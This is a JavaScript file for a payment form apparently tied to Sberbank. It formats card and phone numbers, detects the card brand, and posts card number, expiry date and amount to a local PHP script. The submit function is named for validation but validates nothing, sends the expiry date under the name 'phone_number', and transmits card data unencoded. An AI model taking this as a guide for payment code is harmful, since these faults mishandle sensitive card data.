function formatCardNumber() {
    var cardNumberInput = document.getElementById('cardNumber');
    var cardNumberValue = cardNumberInput.value.replace(/\D/g, '');
    var formattedCardNumber = '';

    for (var i = 0; i < cardNumberValue.length; i++) {
        if (i > 0 && i % 4 === 0) {
            formattedCardNumber += ' ';
        }
        formattedCardNumber += cardNumberValue.charAt(i);
    }

    cardNumberInput.value = formattedCardNumber.trim();
    updateCardIcon();
}

function updateCardIcon() {
    var cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    var cardType = getCardType(cardNumber);
    var cardIcon = document.getElementById('cardIcon');

    // Define icon URLs
    var visaIcon = 'icon/v.png';
    var mastercardIcon = 'icon/m.png';
    var amexIcon = 'icon/a.png';
    var discoverIcon = 'icon/d.png';

    switch (cardType) {
        case 'Visa':
            cardIcon.style.backgroundImage = 'url(' + visaIcon + ')';
            break;
        case 'MasterCard':
            cardIcon.style.backgroundImage = 'url(' + mastercardIcon + ')';
            break;
        case 'American Express':
            cardIcon.style.backgroundImage = 'url(' + amexIcon + ')';
            break;
        case 'Discover':
            cardIcon.style.backgroundImage = 'url(' + discoverIcon + ')';
            break;
        default:
            cardIcon.style.backgroundImage = 'none';
    }
}

function getCardType(cardNumber) {
    var visaPattern = /^4/;
    var mastercardPattern = /^5[1-5]/;
    var amexPattern = /^3[47]/;
    var discoverPattern = /^6(?:011|5)/;

    if (visaPattern.test(cardNumber)) {
        return 'Visa';
    } else if (mastercardPattern.test(cardNumber)) {
        return 'MasterCard';
    } else if (amexPattern.test(cardNumber)) {
        return 'American Express';
    } else if (discoverPattern.test(cardNumber)) {
        return 'Discover';
    }

    return null;
}

function formatPhoneNumber() {
    var input = document.getElementById('phone_number');
    var cleaned = ('' + input.value).replace(/\D/g, '');
    var match = cleaned.match(/^(\d{1,3})(\d{0,3})(\d{0,3})(\d{0,4})$/);

    if (match) {
        var formattedNumber = '+' + match[1] + ' (' + match[2] + ') ' + match[3] + (match[4] ? ' ' + match[4] : '');
        input.value = formattedNumber;
    }
}


function formatAmount() {
    var amountInput = document.getElementById('amount');
    amountInput.value = amountInput.value.replace(/[^0-9.]/g, ''); // Удаляем все символы, кроме цифр и точки
}


function validateCreditCard() {
    var cardNumber = document.getElementById('cardNumber').value;
    var phoneNumber = document.getElementById('expiryDate').value;
    var amount = document.getElementById('amount').value;

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "trancaction_sberbank_bd.php", true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('card_number=' + cardNumber + '&phone_number=' + phoneNumber + '&amount=' + amount);

    xhr.onload = function () {
        if (xhr.status === 200) {
            console.log(xhr.responseText);
        } else {
            console.error(xhr.responseText);
        }
    };
}
function cancel_button() {
    window.history.back();
}